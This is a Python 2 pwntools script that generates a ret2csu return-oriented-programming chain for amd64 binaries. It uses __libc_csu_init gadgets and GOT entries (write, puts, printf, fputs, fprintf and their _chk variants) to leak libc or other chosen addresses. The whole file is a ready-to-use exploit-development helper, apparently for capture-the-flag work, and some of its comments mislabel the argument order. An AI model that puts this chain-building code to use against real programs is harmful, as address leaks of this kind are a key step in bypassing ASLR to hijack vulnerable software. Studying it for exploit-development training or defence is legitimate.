from pwn import *
import sys

if len(sys.argv) < 2:
    print "usage: python leakyleak.py <binary> [address_of_pointer_to_leak] [address_of_libc_csu_init]"
    exit(1)

to_leak = None
if len(sys.argv) > 2:
    try:
        to_leak = int(sys.argv[2], 16)
    except:
        print "error: the address of the pointer to leak must be an exadecimal number"
        exit(1)

binary = ELF(sys.argv[1])

if binary.arch != "amd64":
    print "error: the binary arch must be amd64"
    exit(1)

if len(sys.argv) > 3:
    try:
        csu_init_addr = int(sys.argv[3], 16)
    except:
        print "error: the address of __libc_csu_init must be an exadecimal number"
        exit(1)
    gadget1 = csu_init_addr + (0x4005EA - 0x400590)
    gadget2 = csu_init_addr + (0x4005D0 - 0x400590)
else:
    try:
        gadget1 = binary.symbols["__libc_csu_init"] + (0x4005EA - 0x400590)
        gadget2 = binary.symbols["__libc_csu_init"] + (0x4005D0 - 0x400590)
    except KeyError:
        print "error: __libc_csu_init is not in the symbols list, specify address_of_libc_csu_init in program args"
        exit(1)

if "write" in binary.got:
    print "[*] using `write` to print the leak"
    print
    # write(1, &write, sizeof(void*))
    print "rop = ''"
    print "rop += p64(0x%x) # gadget 1" % gadget1
    print "rop += p64(0) # rbx"
    print "rop += p64(1) # rbp"
    print "rop += p64(0x%x) # r12 [write@got]" % binary.got["write"]
    print "rop += p64(8) # r13 [sizeof void*]"
    if to_leak == None:
        print "rop += p64(0x%x) # r14 [write@got]" % binary.got["write"]
    else:
        print "rop += p64(0x%x) # r14 [address to leak]" % to_leak
    print "rop += p64(1) # r15 [stdout]"
    print "rop += p64(0x%x) # gadget 2" % gadget2
    print "rop += p64(0xdeadbeef) # junk"
    print "rop += p64(0) # rbx"
    print "rop += p64(0) # rbp"
    print "rop += p64(0) # r12"
    print "rop += p64(0) # r13"
    print "rop += p64(0) # r14"
    print "rop += p64(0) # r15"
elif "puts" in binary.got:
    print "[*] using `puts` to print the leak"
    print
    # puts(&puts)
    print "rop = ''"
    print "rop += p64(0x%x) # gadget 1" % gadget1
    print "rop += p64(0) # rbx"
    print "rop += p64(1) # rbp"
    print "rop += p64(0x%x) # r12 [puts@got]" % binary.got["puts"]
    print "rop += p64(0) # r13"
    print "rop += p64(0) # r14"
    if to_leak == None:
        print "rop += p64(0x%x) # r15 [puts@got]" % binary.got["puts"]
    else:
        print "rop += p64(0x%x) # r15 [address to leak]" % to_leak
    print "rop += p64(0x%x) # gadget 2" % gadget2
    print "rop += p64(0xdeadbeef) # junk"
    print "rop += p64(0) # rbx"
    print "rop += p64(0) # rbp"
    print "rop += p64(0) # r12"
    print "rop += p64(0) # r13"
    print "rop += p64(0) # r14"
    print "rop += p64(0) # r15"
elif "printf" in binary.got:
    print "[*] using `printf` to print the leak"
    print
    # printf(&printf)
    print "rop = ''"
    print "rop += p64(0x%x) # gadget 1" % gadget1
    print "rop += p64(0) # rbx"
    print "rop += p64(1) # rbp"
    print "rop += p64(0x%x) # r12 [printf@got]" % binary.got["printf"]
    print "rop += p64(0) # r13"
    print "rop += p64(0) # r14"
    if to_leak == None:
        print "rop += p64(0x%x) # r15 [printf@got]" % binary.got["printf"]
    else:
        print "rop += p64(0x%x) # r15 [address to leak]" % to_leak
    print "rop += p64(0x%x) # gadget 2" % gadget2
    print "rop += p64(0xdeadbeef) # junk"
    print "rop += p64(0) # rbx"
    print "rop += p64(0) # rbp"
    print "rop += p64(0) # r12"
    print "rop += p64(0) # r13"
    print "rop += p64(0) # r14"
    print "rop += p64(0) # r15"
elif "__printf_chk" in binary.got:
    print "[*] using `___printf_chk` to print the leak"
    print
    # __printf_chk(0, &__printf_chk)
    print "rop = ''"
    print "rop += p64(0x%x) # gadget 1" % gadget1
    print "rop += p64(0) # rbx"
    print "rop += p64(1) # rbp"
    print "rop += p64(0x%x) # r12 [__printf_chk@got]" % binary.got["__printf_chk"]
    print "rop += p64(0) # r13"
    if to_leak == None:
        print "rop += p64(0x%x) # r14 [__printf_chk@got]" % binary.got["__printf_chk"]
    else:
        print "rop += p64(0x%x) # r14 [address to leak]" % to_leak
    print "rop += p64(0) # r15"
    print "rop += p64(0x%x) # gadget 2" % gadget2
    print "rop += p64(0xdeadbeef) # junk"
    print "rop += p64(0) # rbx"
    print "rop += p64(0) # rbp"
    print "rop += p64(0) # r12"
    print "rop += p64(0) # r13"
    print "rop += p64(0) # r14"
    print "rop += p64(0) # r15"
elif "stdout" in binary.symbols:
    if "fputs" in binary.got:
        print "[*] using `fputs` to print the leak"
        print
        # fputs(stdout, &fputs)
        print "rop = ''"
        print "rop += p64(0x%x) # gadget 1" % gadget1
        print "rop += p64(0) # rbx"
        print "rop += p64(1) # rbp"
        print "rop += p64(0x%x) # r12 [fputs@got]" % binary.got["fputs"]
        print "rop += p64(0) # r13"
        print "rop += p64(0x%x) # r14 [stdout]" % binary.symbols["stdout"]
        if to_leak == None:
            print "rop += p64(0x%x) # r15 [fputs@got]" % binary.got["fputs"]
        else:
            print "rop += p64(0x%x) # r15 [address to leak]" % to_leak
        print "rop += p64(0x%x) # gadget 2" % gadget2
        print "rop += p64(0xdeadbeef) # junk"
        print "rop += p64(0) # rbx"
        print "rop += p64(0) # rbp"
        print "rop += p64(0) # r12"
        print "rop += p64(0) # r13"
        print "rop += p64(0) # r14"
        print "rop += p64(0) # r15"
    elif "_fputs_unlocked" in binary.got:
        print "[*] using `_fputs_unlocked` to print the leak"
        print
        # fputs(stdout, &fputs)
        print "rop = ''"
        print "rop += p64(0x%x) # gadget 1" % gadget1
        print "rop += p64(0) # rbx"
        print "rop += p64(1) # rbp"
        print "rop += p64(0x%x) # r12 [_fputs_unlocked@got]" % binary.got["_fputs_unlocked"]
        print "rop += p64(0) # r13"
        print "rop += p64(0x%x) # r14 [stdout]" % binary.symbols["stdout"]
        if to_leak == None:
            print "rop += p64(0x%x) # r15 [_fputs_unlocked@got]" % binary.got["_fputs_unlocked"]
        else:
            print "rop += p64(0x%x) # r15 [address to leak]" % to_leak
        print "rop += p64(0x%x) # gadget 2" % gadget2
        print "rop += p64(0xdeadbeef) # junk"
        print "rop += p64(0) # rbx"
        print "rop += p64(0) # rbp"
        print "rop += p64(0) # r12"
        print "rop += p64(0) # r13"
        print "rop += p64(0) # r14"
        print "rop += p64(0) # r15"
    elif "fprintf" in binary.got:
        print "[*] using `fprintf` to print the leak"
        print
        # fprintf(stdout, &fprintf)
        print "rop = ''"
        print "rop += p64(0x%x) # gadget 1" % gadget1
        print "rop += p64(0) # rbx"
        print "rop += p64(1) # rbp"
        print "rop += p64(0x%x) # r12 [fprintf@got]" % binary.got["fprintf"]
        print "rop += p64(0) # r13"
        if to_leak == None:
            print "rop += p64(0x%x) # r14 [fprintf@got]" % binary.got["fprintf"]
        else:
            print "rop += p64(0x%x) # r14 [address to leak]" % to_leak
        print "rop += p64(0x%x) # r15 [stdout]" % binary.symbols["stdout"]
        print "rop += p64(0x%x) # gadget 2" % gadget2
        print "rop += p64(0xdeadbeef) # junk"
        print "rop += p64(0) # rbx"
        print "rop += p64(0) # rbp"
        print "rop += p64(0) # r12"
        print "rop += p64(0) # r13"
        print "rop += p64(0) # r14"
        print "rop += p64(0) # r15"
    elif "__fprintf_chk" in binary.got:
        print "[*] using `__fprintf_chk` to print the leak"
        print
        # __fprintf_chk(stdout, 0, &__fprintf_chk)
        print "rop = ''"
        print "rop += p64(0x%x) # gadget 1" % gadget1
        print "rop += p64(0) # rbx"
        print "rop += p64(1) # rbp"
        print "rop += p64(0x%x) # r12 [__fprintf_chk@got]" % binary.got["__fprintf_chk"]
        if to_leak == None:
            print "rop += p64(0x%x) # r13 [__fprintf_chk@got]" % binary.got["__fprintf_chk"]
        else:
            print "rop += p64(0x%x) # r13 [address to leak]" % to_leak
        print "rop += p64(0) # r14"
        print "rop += p64(0x%x) # r15 [stdout]" % binary.symbols["stdout"]
        print "rop += p64(0x%x) # gadget 2" % gadget2
        print "rop += p64(0xdeadbeef) # junk"
        print "rop += p64(0) # rbx"
        print "rop += p64(0) # rbp"
        print "rop += p64(0) # r12"
        print "rop += p64(0) # r13"
        print "rop += p64(0) # r14"
        print "rop += p64(0) # r15"












